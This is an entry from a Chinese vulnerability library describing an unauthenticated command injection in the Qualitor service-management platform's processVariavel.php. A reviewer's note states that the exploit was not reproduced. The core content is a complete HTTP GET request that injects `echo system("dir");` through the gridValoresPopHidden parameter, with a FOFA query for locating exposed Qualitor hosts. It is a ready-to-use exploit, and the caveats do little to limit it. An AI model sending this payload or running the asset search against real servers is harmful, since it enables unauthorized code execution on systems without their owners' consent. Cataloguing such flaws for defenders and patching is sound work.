---
source: "wy876 漏洞文库"
id: "vw-6d2018f58ef5a3e0be90c713"
entity_id: "ve-6d2018f58ef5a3e0be90c713"
schema_version: "1"
title: "Qualitor processVariavel.php存在未授权命令注入漏洞"
product: "Qualitor服务管理平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无认证头，PHP代码形式system(dir)，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Qualitor/QualitorprocessVariavel.php%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/qxvfq9fqnxr606r4"
source_status: "recorded"
---

# Qualitor processVariavel.php存在未授权命令注入漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Qualitor服务管理平台
- 本文讨论：processVariavel.php gridValoresPopHidden注入
- 版本、权限与配置前提：无认证头，PHP代码形式system(dir)，版本未知
- 资料类型：代码/命令注入请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 参数是PHP语句，需区分代码求值与shell命令拼接根因
- 无返回结果/源码与修复版本；安全设备分类不精确
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- CVE归属、匿名条件和受影响版本待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
Qualitor processVariavel.php存在未授权命令注入漏洞

# 二、影响版本
+ Qualitor 

# 三、资产测绘
+ fofa`app="Qualitor-Web"`
+ 特征


# 四、漏洞复现
```http
GET /html/ad/adpesquisasql/request/processVariavel.php?gridValoresPopHidden=echo%20system("dir"); HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Connection: keep-alive
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qxvfq9fqnxr606r4>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
